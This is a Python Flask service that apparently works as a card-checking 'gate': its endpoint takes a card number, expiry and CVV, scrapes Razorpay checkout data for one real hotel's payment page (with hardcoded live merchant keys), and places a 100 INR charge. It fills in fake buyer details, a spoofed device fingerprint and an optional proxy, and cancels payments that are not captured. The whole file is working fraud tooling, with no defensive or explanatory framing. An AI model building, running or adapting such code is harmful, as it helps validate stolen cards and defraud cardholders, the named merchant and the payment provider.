import requests
import json
import time
import random
from urllib.parse import urlencode, urlparse, parse_qs, unquote
from datetime import datetime
import re
import os
import sys
import platform
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup
from typing import Optional
import threading
from queue import Queue
import logging
from flask import Flask, request, jsonify

# Flask setup
app = Flask(__name__)

# Rest of your existing code
logging.basicConfig(level=logging.WARNING)

request_queue = Queue(maxsize=100)
processing_lock = threading.Lock()

DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."

PROXY_CONFIG = None

def setup_proxy(proxy_string):
    if not proxy_string or proxy_string.strip() == "":
        return None
    
    try:
        parts = proxy_string.split(':')
        if len(parts) == 4:
            ip = parts[0].strip()
            port = parts[1].strip()
            username = parts[2].strip()
            password = parts[3].strip()
            
            if not ip or not port or not username or not password:
                return None
            
            return {
                "server": f"http://{ip}:{port}",
                "username": username,
                "password": password
            }
        else:
            return None
    except Exception:
        return None 

def get_dynamic_session_token():
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(
                headless=True, 
                proxy=PROXY_CONFIG,
                args=browser_args
            )
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            initial_url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
            page.goto(initial_url, timeout=30000)
            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            final_url = page.url
            browser.close()

            session_token = parse_qs(urlparse(final_url).query).get("session_token", [None])[0]
            return (session_token, None) if session_token else (None, "Token not found in URL.")
    except Exception as e:
        return None, f"Session token error: {str(e)[:100]}"

def handle_redirect_and_get_result(redirect_url):
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(
                headless=True, 
                proxy=PROXY_CONFIG,
                args=browser_args
            )
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            page.goto(redirect_url, timeout=45000, wait_until='networkidle')

            html_content = page.content()
            
            body_locator = page.locator("body")
            body_locator.wait_for(timeout=10000)
            full_status_text = body_locator.inner_text()

            browser.close()

            if 'razorpay_signature' in html_content:
                return "payment successful"
            
            return " ".join(full_status_text.split())
    except Exception as e:
        return f"Redirect error: {str(e)[:100]}"

def extract_merchant_data_direct(site_url):
    try:
        merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
        if not merchant_match:
            return None, None, None, None, "Invalid Razorpay URL format. Expected: https://razorpay.me/@merchant"
        
        merchant_handle = merchant_match.group(1)
        
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(
                headless=True, 
                proxy=PROXY_CONFIG,
                args=browser_args
            )
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            
            page.goto(site_url, timeout=45000, wait_until='networkidle')
            
            keyless_header = None
            key_id = None
            payment_link_id = None
            payment_page_item_id = None
            
            try:
                page.wait_for_timeout(3000)
                
                data_from_page = page.evaluate("""
                    () => {
                        if (window.data) return window.data;
                        if (window.__INITIAL_STATE__) return window.__INITIAL_STATE__;
                        if (window.__CHECKOUT_DATA__) return window.__CHECKOUT_DATA__;
                        
                        const scripts = document.querySelectorAll('script');
                        for (let script of scripts) {
                            const text = script.textContent || script.innerText;
                            if (text.includes('keyless_header') || text.includes('payment_link')) {
                                const matches = text.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
                                if (matches) {
                                    for (let match of matches) {
                                        try {
                                            const parsed = JSON.parse(match);
                                            if (parsed.keyless_header || parsed.key_id) {
                                                return parsed;
                                            }
                                        } catch (e) {}
                                    }
                                }
                            }
                        }
                        return null;
                    }
                """)
                
                if data_from_page:
                    keyless_header = data_from_page.get('keyless_header')
                    key_id = data_from_page.get('key_id')
                    payment_link = data_from_page.get('payment_link', {})
                    payment_link_id = payment_link.get('id') if isinstance(payment_link, dict) else None
                    payment_page_items = payment_link.get('payment_page_items', []) if isinstance(payment_link, dict) else []
                    payment_page_item_id = payment_page_items[0].get('id') if payment_page_items else None
                    
            except Exception as e:
                pass
            
            browser.close()
            
            if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
                
                fallback_data = {
                    'hotelparasinternationaldelhi': {
                        'key_id': 'rzp_live_hrgl3RDoNMvCOs',
                        'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
                        'payment_link_id': 'pl_OzLkvRvf1drPps',
                        'payment_page_item_id': 'ppi_OzLkvSvf1drPpt'
                    }
                }
                
                if merchant_handle in fallback_data:
                    data = fallback_data[merchant_handle]
                    keyless_header = data['keyless_header']
                    key_id = data['key_id']
                    payment_link_id = data['payment_link_id']
                    payment_page_item_id = data['payment_page_item_id']
                else:
                    try:
                        api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}"
                        response = requests.get(api_url, timeout=10)
                        if response.status_code == 200:
                            api_data = response.json()
                            keyless_header = api_data.get('keyless_header')
                            key_id = api_data.get('key_id')
                            payment_link_id = api_data.get('id')
                            payment_page_item_id = api_data.get('payment_page_items', [{}])[0].get('id')
                    except:
                        pass
            
            
            if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
                missing = []
                if not keyless_header: missing.append('keyless_header')
                if not key_id: missing.append('key_id')
                if not payment_link_id: missing.append('payment_link_id')
                if not payment_page_item_id: missing.append('payment_page_item_id')
                return None, None, None, None, f"Could not extract required merchant data. Missing: {', '.join(missing)}. Try adding merchant '{merchant_handle}' to fallback_data."
            
            return keyless_header, key_id, payment_link_id, payment_page_item_id, None
            
    except Exception as e:
        return None, None, None, None, f"Error in direct merchant data extraction: {e}"

def random_user_info():
    return {"name": "Test User", "email": f"testuser{random.randint(100,999)}@gmail.com", "phone": f"9876543{random.randint(100,999)}"}

def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    payload = {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]}
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15)
        resp.raise_for_status()
        return resp.json().get("order", {}).get("id")
    except: return None

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {"key_id": key_id, "session_token": session_token, "keyless_header": keyless_header}
    headers = {"x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
    data = {
        "notes[comment]": "", "payment_link_id": payment_link_id, "key_id": key_id, "callback_url": "https://your-server.com/callback",
        "contact": f"+91{user_info['phone']}", "email": user_info["email"], "currency": "INR", "_[library]": "checkoutjs",
        "_[platform]": "browser", "_[referer]": site_url, "amount": amount_paise, "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT, "method": "card", "card[number]": card_number,
        "card[cvv]": cvv, "card[name]": user_info["name"], "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year, "save": "0"
    }
    return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)

def process_single_card(card_index, cc_line, payment_link_id, amount_paise, payment_page_item_id, key_id, keyless_header, session_token, site_url):
    start_time = time.time()
    result = {
        'index': card_index,
        'card': cc_line,
        'status': '',
        'card_masked': '',
        'proxy': '',
        'time': 0,
        'payment_id': '',
        'order_id': ''
    }
    
    try:
        card_number, exp_month, exp_year, cvv = cc_line.split('|')
        result['card_masked'] = f"{card_number[:6]}******{card_number[-4:]}"
    except ValueError:
        result['status'] = "Invalid card format in cards.txt. Skipping."
        result['time'] = round(time.time() - start_time, 2)
        return result

    session = requests.Session()
    order_id = create_order(session, payment_link_id, amount_paise, payment_page_item_id)
    if not order_id:
        result['status'] = "FATAL: Failed to generate Razorpay order ID."
        result['time'] = round(time.time() - start_time, 2)
        return result
    else:
        result['order_id'] = order_id

    time.sleep(random.uniform(1, 2))

    status_message = ""
    payment_id = None
    try:
        response = submit_payment(
            session,
            order_id,
            (card_number, exp_month, exp_year, cvv),
            random_user_info(),
            amount_paise,
            key_id,
            keyless_header,
            payment_link_id,
            session_token,
            site_url
        )
        data = response.json()

        if "payment_id" in data:
            payment_id = data["payment_id"]
        elif "razorpay_payment_id" in data:
            payment_id = data["razorpay_payment_id"]
        elif "payment" in data and isinstance(data["payment"], dict) and "id" in data["payment"]:
            payment_id = data["payment"]["id"]
        
        if payment_id:
            result['payment_id'] = payment_id

        if data.get("redirect") == True or data.get("type") == "redirect":
            if payment_id:
                redirect_url = data.get('request', {}).get('url', '') if isinstance(data.get('request'), dict) else ''
                if redirect_url:
                    final_result = handle_redirect_and_get_result(redirect_url)
                    
                    if final_result == "PAYMENT_SUCCESSFUL_WITH_SIGNATURE" or 'razorpay_signature' in final_result:
                        status_message = f"PAYMENT_SUCCESS -> PaymentID: {payment_id} -> Payment successful -> AuthResult: {final_result}"
                    else:
                        payment_status, status_data = check_payment_status(payment_id, key_id, session_token, keyless_header)
                        
                        if payment_status == 'captured' or payment_status == 'authorized':
                            status_message = f"PAYMENT_SUCCESS -> PaymentID: {payment_id} -> Status: {payment_status} -> AuthResult: {final_result}"
                        else:
                            cancel_result = cancel_payment(payment_id, key_id, session_token, keyless_header)
                            status_message = f"3DS_AUTH_COMPLETED -> PaymentID: {payment_id} -> Status: {payment_status} -> AuthResult: {final_result} -> CancelResult: {cancel_result}"
                else:
                    status_message = f"3DS_REDIRECT -> PaymentID: {payment_id} -> No redirect URL found"
            else:
                fallback_url = data.get('request', {}).get('url', 'N/A') if isinstance(data.get('request'), dict) else 'N/A'
                status_message = f"3DS_REDIRECT but payment_id missing. RedirectURL={fallback_url}"
        elif "razorpay_signature" in data or "signature" in data:
            signature = data.get('razorpay_signature') or data.get('signature')
            status_message = f"PAYMENT_SUCCESS -> PaymentID: {payment_id} -> Signature: {signature} -> Status: charged"
        elif "error" in data:
            error_msg = json.dumps(data.get('error', data))
            status_message = f"ERROR: {error_msg}"
            if payment_id:
                status_message = f"PaymentID: {payment_id} -> " + status_message
        else:
            status_message = f"SUCCESS: {json.dumps(data)}"
            if payment_id:
                status_message = f"PaymentID: {payment_id} -> " + status_message

    except Exception as e:
        status_message = f"SCRIPT ERROR during payment submission: {e}"

    result['status'] = status_message
    result['time'] = round(time.time() - start_time, 2)
    result['proxy'] = "Direct Connection" if not PROXY_CONFIG else PROXY_CONFIG.get('server', 'Unknown Proxy')
    
    return result

def check_payment_status(payment_id, key_id, session_token, keyless_header):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-session-token': session_token,
    }

    params = {
        'key_id': key_id,
        'session_token': session_token,
        'keyless_header': keyless_header,
    }

    try:
        response = requests.get(
            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}',
            params=params,
            headers=headers,
            timeout=15
        )
        
        if response.status_code == 200:
            try:
                data = response.json()
                status = data.get('status', 'unknown')
                return status, data
            except json.JSONDecodeError:
                return 'unknown', {'error': 'Invalid JSON response'}
        else:
            return 'unknown', {'error': f'Status check failed: {response.status_code}'}
            
    except Exception as e:
        return 'unknown', {'error': f'Status check error: {e}'}

def cancel_payment(payment_id, key_id, session_token, keyless_header):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-type': 'application/x-www-form-urlencoded',
        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-session-token': session_token,
    }

    params = {
        'key_id': key_id,
        'session_token': session_token,
        'keyless_header': keyless_header,
    }

    try:
        response = requests.get(
            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
            params=params,
            headers=headers,
            timeout=15
        )
        
        if response.status_code == 200:
            try:
                data = response.json()
                return format_cancel_response(data)
            except json.JSONDecodeError:
                return f"Cancel Response (Status {response.status_code}): {response.text}"
        else:
            return f"Cancel Request Failed (Status {response.status_code}): {response.text}"
            
    except Exception as e:
        return f"Cancel Request Error: {e}"

def handle_successful_payment(payment_id, order_id, signature):
    return {
        'status': 'success',
        'payment_id': payment_id,
        'order_id': order_id,
        'signature': signature,
        'message': 'Payment completed successfully'
    }

def format_cancel_response(data):
    if "error" in data:
        error = data["error"]
        formatted = f"CANCEL ERROR - Code: {error.get('code', 'Unknown')}"
        formatted += f" | Description: {error.get('description', 'No description')}"
        formatted += f" | Source: {error.get('source', 'Unknown')}"
        formatted += f" | Step: {error.get('step', 'Unknown')}"
        formatted += f" | Reason: {error.get('reason', 'Unknown')}"
        
        if "metadata" in error:
            metadata = error["metadata"]
            formatted += f" | Payment ID: {metadata.get('payment_id', 'Unknown')}"
            formatted += f" | Order ID: {metadata.get('order_id', 'Unknown')}"
        
        return formatted
    else:
        return f"Cancel Response: {json.dumps(data, indent=2)}"

def process_request_worker():
    while True:
        try:
            request_data = request_queue.get(timeout=1)
            if request_data is None:
                break
            request_data['result'] = process_card_request(request_data)
            request_queue.task_done()
        except:
            continue

def process_card_request(request_data):
    try:
        with processing_lock:
            return request_data['handler'](request_data['args'])
    except Exception as e:
        return {'error': str(e)}

# Flask endpoint
@app.route('/gate=rz/cc=<card_info>', methods=['GET'])
def process_payment(card_info):
    try:
        # Parse card information
        card_parts = card_info.split('|')
        if len(card_parts) != 4:
            return jsonify({
                'status': 'error',
                'message': 'Invalid card format. Expected: card_number|mm|yy|cvv'
            })
        
        card_number, exp_month, exp_year, cvv = card_parts
        
        # Use default merchant data from fallback_data
        merchant_handle = 'hotelparasinternationaldelhi'
        site_url = f"https://razorpay.me/@{merchant_handle}"
        
        # Get merchant data
        keyless_header, key_id, payment_link_id, payment_page_item_id, error = extract_merchant_data_direct(site_url)
        
        if error:
            return jsonify({
                'status': 'error',
                'message': f'Failed to extract merchant data: {error}'
            })
        
        # Get session token
        session_token, token_error = get_dynamic_session_token()
        
        if token_error:
            return jsonify({
                'status': 'error',
                'message': f'Failed to get session token: {token_error}'
            })
        
        # Set default amount (100 INR = 10000 paise)
        amount_paise = 10000
        
        # Process the payment
        result = process_single_card(
            0,  # card_index
            card_info,  # cc_line
            payment_link_id,
            amount_paise,
            payment_page_item_id,
            key_id,
            keyless_header,
            session_token,
            site_url
        )
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Unexpected error: {str(e)}'
        })

def main():
    # Start worker threads
    for _ in range(3):
        threading.Thread(target=process_request_worker, daemon=True).start()
    
    # Run Flask app
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == "__main__":
    main()
